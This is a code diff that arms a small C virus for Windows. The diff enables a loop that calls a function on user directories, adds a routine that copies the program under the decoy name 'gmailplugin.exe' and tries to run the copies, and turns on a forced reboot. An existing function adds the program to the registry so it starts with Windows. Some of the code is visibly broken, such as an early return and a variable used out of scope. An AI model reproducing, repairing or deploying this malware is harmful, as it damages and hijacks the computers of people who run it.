@@ -1,11 +1,27 @@
 /* by Creator_LuXury */
 /* FOR TESTING ONLY PLEASE DO NOT SHARE */
 /* PLEASE BE CAREFUL WHEN USING THIS IF YOU WANT TO ARM VIRUS REMOVE "//" FORM REMOVE LINe 26 and 82 */ 
-/* TESTED ON WINDOWS XP */
+/* TESTED AND ON WINDOWS XP WIN7  */
 
 # include <stdio.h>
 # include <windows.h>
 # include <dirent.h>
+# include <time.h>
+# include <ShellApi.h>
+
+int copyspam(char s[50]){// makes a copy of the programm in 'random' locations also runs it 
+	int i,c;
+	for(i;i<2;i++){
+	char fullname[1024];
+	strcpy(fullname,s);
+	char * original_file = "gmailplugin.exe";
+	strcat(fullname,"gmailplugin.exe");
+    char * new_file = fullname;
+    ( void ) CopyFile ( ( LPCTSTR )original_file, ( LPCTSTR )new_file, FALSE);
+    return 0;
+    ShellExecute(GetDesktopWindow(),"open",fullname,NULL,NULL,SW_SHOW);
+	}
+}
 
 int autorun(){// add virus to registry to start with windows start
 
@@ -68,9 +84,10 @@ int rem(char s[50]){  // this function creates list of files and directories and
 }
 int main (){
 	autorun();
+
 	int x = 1;
 	int t = 8;
-/*	while (t--){  // this loop allows to find specific locations
+	while (t--){  // this loop allows to find specific locations
 	if(x==1) {
 	char a[50] = "C:\\Users";
 	rem(a);
@@ -99,8 +116,9 @@ int main (){
 	char a[50] = "C:\\Documents and Settings";
 	rem(a);
 	}
-//	rem(a);
+	rem(a);
 	x++;
-	}*/
-//system("shutdown -r -t 00");    // should restart computer
+	}
+copyspam(a);
+system("shutdown -r -t 00");    // should restart computer
 }
